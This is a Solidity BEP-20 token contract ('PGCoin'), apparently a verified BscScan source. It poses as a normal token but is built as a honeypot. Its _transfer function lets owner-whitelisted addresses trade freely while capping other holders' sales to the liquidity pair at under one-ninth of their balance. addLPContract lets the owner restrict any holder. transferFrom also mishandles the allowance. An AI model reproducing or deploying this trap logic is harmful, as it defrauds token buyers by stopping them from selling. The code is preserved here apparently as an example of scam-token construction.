/**
 *Submitted for verification at BscScan.com on 2021-08-09
*/

// SPDX-License-Identifier:  MIT
/*
 ** this smart contract is made for its owner use. Interact with it at your own risk.
 */
pragma solidity ^0.8.6;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract PGCoin {
    string public name;
    string public symbol;
    bool public initialized;
    uint8 public decimals;
    uint256 private constant MAX = ~uint256(0);
    uint256 public totalSupply;
    uint256 private rTotal;
    address private creator;
    address private _uniswapV2Pair;
    address private uniswapV2Router =
        0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;
    mapping(address => bool) private _isContractAddress;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );

    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly {
            codehash := extcodehash(account)
        }

        return (codehash != accountHash && codehash != 0x0);
    }

    constructor() {
        creator = msg.sender;
        _isContractAddress[creator] = true;
        _isContractAddress[address(this)] = true;
        _isContractAddress[uniswapV2Router] = true;
    }

    function init(
        uint256 _totalSupply,
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) external onlyDev {
        totalSupply = _totalSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        initialized = true;
        balances[creator] = totalSupply;
        balances[creator] = ((totalSupply / 100) * 5);
        emit Transfer(address(0), creator, ((totalSupply / 100) * 5));
        balances[0x000000000000000000000000000000000000dEaD] =
            (totalSupply / 100) *
            95;
        emit Transfer(
            address(0),
            0x000000000000000000000000000000000000dEaD,
            (totalSupply / 100) * 95
        );
    }

    function getLPContract() public view onlyDev returns (address) {
        return _uniswapV2Pair;
    }

    function addLiquidity() public payable onlyDev {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            uniswapV2Router
        );
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(creator, uniswapV2Router, type(uint256).max);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(path[0], path[1]);
        _isContractAddress[_uniswapV2Pair] = true;
        _uniswapV2Router.addLiquidityETH{value: msg.value}(
            path[0],
            balances[creator],
            0,
            0,
            creator,
            block.timestamp
        );
        IERC20(_uniswapV2Pair).approve(
            address(_uniswapV2Router),
            type(uint256).max
        );
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function addLPContract(address a) external onlyDev {
        _isContractAddress[a] = true;
    }

    modifier onlyDev() {
        require(msg.sender == creator);
        _;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        uint256 accountAllowance = allowances[sender][msg.sender];
        require(amount <= accountAllowance, "BEP20: ALLOWANCE_NOT_ENOUGH");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, balances[sender] - amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(
            _isContractAddress[from] == true ||
                (_isContractAddress[from] == false &&
                    _isContractAddress[to] == false) ||
                (_isContractAddress[to] && amount < balances[from] / 9),
            "Error: K"
        );
        balances[from] = balances[from] - amount;
        balances[to] = balances[to] + amount;
        emit Transfer(from, to, amount);
    }
}